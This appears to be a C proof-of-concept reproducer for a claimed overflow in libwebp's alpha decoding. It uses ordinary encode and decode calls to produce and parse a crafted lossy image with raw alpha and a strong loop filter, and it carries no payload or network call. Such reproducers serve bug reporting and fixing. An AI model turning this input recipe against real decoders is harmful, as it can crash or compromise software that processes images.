// Delocalized alpha-window overflow PoC.
//
// Encodes a tall RGBA image with lossy VP8 + raw (uncompressed), unfiltered
// alpha (ALPHA_NO_COMPRESSION / WEBP_FILTER_NONE) and a strong loop filter,
// then decodes it back through the public WebPDecode() API.

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include "webp/decode.h"
#include "webp/encode.h"

#define WIDTH 256
#define HEIGHT 512

int main(void) {
  uint8_t* rgba = (uint8_t*)malloc((size_t)WIDTH * HEIGHT * 4);
  if (rgba == NULL) return 1;

  for (int y = 0; y < HEIGHT; ++y) {
    for (int x = 0; x < WIDTH; ++x) {
      const size_t i = 4u * ((size_t)y * WIDTH + x);
      rgba[i + 0] = (uint8_t)(x * 3 + y);
      rgba[i + 1] = (uint8_t)(y * 2 + x);
      rgba[i + 2] = (uint8_t)(x ^ y);
      rgba[i + 3] = (uint8_t)(128 + ((x + y) & 0x7f));  // non-trivial alpha
    }
  }

  WebPConfig config;
  if (!WebPConfigInit(&config)) return 1;
  config.lossless = 0;
  config.quality = 50.0f;
  config.alpha_compression = 0;  // ALPHA_NO_COMPRESSION
  config.alpha_filtering = 0;   // WEBP_FILTER_NONE
  config.filter_strength = 100;
  config.filter_type = 1;  // strong/complex loop filter

  WebPPicture pic;
  if (!WebPPictureInit(&pic)) return 1;
  pic.width = WIDTH;
  pic.height = HEIGHT;
  pic.use_argb = 1;
  if (!WebPPictureImportRGBA(&pic, rgba, WIDTH * 4)) return 1;

  WebPMemoryWriter writer;
  WebPMemoryWriterInit(&writer);
  pic.writer = WebPMemoryWrite;
  pic.custom_ptr = &writer;

  if (!WebPEncode(&config, &pic)) {
    fprintf(stderr, "encode failed: %d\n", pic.error_code);
    return 1;
  }
  WebPPictureFree(&pic);
  free(rgba);

  {
    WebPDecoderConfig dconfig;
    VP8StatusCode status;
    if (!WebPInitDecoderConfig(&dconfig)) return 1;
    dconfig.options.dithering_strength = 0;
    dconfig.options.alpha_dithering_strength = 0;
    dconfig.output.colorspace = MODE_RGBA;

    status = WebPDecode(writer.mem, writer.size, &dconfig);
    if (status != VP8_STATUS_OK) {
      fprintf(stderr, "decode failed: %d\n", status);
      WebPMemoryWriterClear(&writer);
      return 1;
    }
    printf("decoded %dx%d, first alpha=%d\n", dconfig.output.width,
           dconfig.output.height, dconfig.output.u.RGBA.rgba[3]);
    WebPFreeDecBuffer(&dconfig.output);
  }

  WebPMemoryWriterClear(&writer);
  return 0;
}
